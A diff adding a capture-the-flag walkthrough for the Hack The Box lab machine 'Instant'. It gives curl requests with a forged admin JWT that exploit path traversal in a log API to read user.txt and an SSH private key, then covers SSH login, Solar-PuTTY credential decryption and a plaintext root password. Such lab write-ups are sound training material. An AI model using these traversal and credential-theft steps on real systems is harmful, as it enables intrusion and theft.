@@ -1,0 +1,33 @@
+Add ip to /etc/hosts – instant.htb
+Sub domain found - swagger-ui.instant.htb
+swagger-ui.instant.htb/downloads/instant.apk
+Get the JWT token inside the apk file
+secret key of jwt VeryStrongS3cretKeyY0uC4NTGET
+API Request page – http://swagger-ui.instant.htb/apidocs/
+Using GET Request along with the JWT token to get user.txt and SSH Keys
+Open terminal to use curl command ( easy method , you can also use Burp )
+
+Instant User Flag –
+
+curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2Fuser.txt" -H "accept: application/json" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
+
+
+To Get id_rsa key by -
+
+curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2F.ssh%2Fid_rsa" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
+
+
+The format for the SSH key is incorrect and needs to be formatted correctly by removing the line breakers \n and “” and adding manual spaces after each line ( the ssh key is dynamic )
+simple way – ask ChatGPT to reform the key , here you have to remove \n which are line breakers and also “” from the id rsa key
+
+nano id_rsa
+paste the key and give appropriate permissions chmod 600
+chmod 600 id_rsa
+ssh -i id_rsa shirohige@instant.htb
+we have the foothold of user shirohige and need privilege escalation
+Got the password using SolarPutty Decrypter
+su root
+root password - 12**24nzC!r0c%q12
+su root : 12**24nzC!r0c%q12
+cd /root
+cat root.txt
